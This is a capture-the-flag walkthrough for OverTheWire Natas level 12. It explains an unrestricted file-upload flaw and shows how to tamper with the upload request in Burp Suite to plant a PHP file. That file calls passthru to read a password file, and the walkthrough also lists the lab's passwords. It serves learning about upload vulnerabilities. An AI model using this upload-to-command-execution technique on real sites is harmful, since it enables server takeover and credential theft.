@@ -1,0 +1,136 @@
+Title:Natas Level 11 → Level 12 (File Upload/Injection Vulnerability)
+
+#Credentials
+Username: natas12
+Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+URL:      http://natas12.natas.labs.overthewire.org
+
+
+#Concept:
+ This level talks about the file injection vulnerability, the vulnerability allows the attackers to upload any file format (exe,php ... etc) where the file may be malicious and allows the website to retrieve data what the attackers desire.The cause of this vulnerability is "un-sanitized" file upload, which means if you are asking a file to be uploaded of a particular file like "Jpeg" then only Jpeg should be alloed to be uploaded and no other file formats should be allowed.
+
+#Note:In order to understand this level you should have a little idea about coding and I am talking about a scripting language like shell and web languages such as php or HTML etc..
+
+
+#Solution
+
+1.Login to the website using the credentials given above.
+
+2.After logging in you will be displayed with the message saying "Choose a JPEG to upload (max 1KB)"
+and below that there are 2 buttons which are to browse a file or to upload the file.
+
+3.Click on the "View source code" to look behind the scenes.
+
+#When checking at the code we can see that there are 3 functions 
+i)The first function creates the "Random String"
+ii)The second function creates a "Random file path"
+iii)The third function creates a "Randomfilepath from the filename"
+
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+#And in this part of the code it checks for the file size if it is too big than 1KB then the file is too large otherwise the file will be uploaded.
+
+#The funny thing is that while checking the file size it is not restricted to what file type should be uploaded (In this case it should have only taken the JPG file format not any other file format)
+
+***This level can be done in one or more ways
+
+#1st way
+
+4.Open up burpsuite and make it ready to intercept traffic from that website.
+
+5.You can either create a php file or you directly change the code in the burpsuite itself.
+
+->If you have uploaded a file then intercept the request by the burpsuite and look at the contents at of the requested packet.
+
+->If you scroll down in burpsuite you can see in the request side there are some sections which will display the size of the file,name of the file, and the content of the file type
+
+
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------233390927525913361083511724278
+Content-Disposition: form-data; name="filename"
+
+w76lmtfr30.jpg
+-----------------------------233390927525913361083511724278
+Content-Disposition: form-data; name="uploadedfile"; filename="natas12.jpg"
+Content-Type: image/jpeg
+
+#Beneath you can see what it is written in the file (If you uploaded a file)
+
+6.Change the file format and the content type in the burpsuite from jpg to php and content type from image/jpeg to application/php
+
+#It should look like this
+
+-----------------------------233390927525913361083511724278
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------233390927525913361083511724278
+Content-Disposition: form-data; name="filename"
+
+w76lmtfr30.php
+-----------------------------233390927525913361083511724278
+Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"
+Content-Type: application/php
+
+#Beneath the content-type you have to type a php command
+
+<?php
+echo passthru('cat /etc/natas_webpass/natas13');
+?>
+
+
+7.Forward this request after alternating the data.
+
+The file upload/ot9x5g3rs1.php has been uploaded
+
+#This will generate the link like this (Yours file name will be different) click on the link which will give you the password for natas13
+
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC  ->Password for natas13
+
+8.Done.
+
+***Alternate WAY
+
+1)Create an html file and copy the main code from the natas12 website
+
+website.html
+
+form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+#In the 3rd line change last word from jpg to php and save it 
+
+2)Create another file which will have the php malicious code.
+
+3)Host the website in your localhost and then send in the malicious file
+
+4)The result will give the password for natas13.
+
+5)Done.
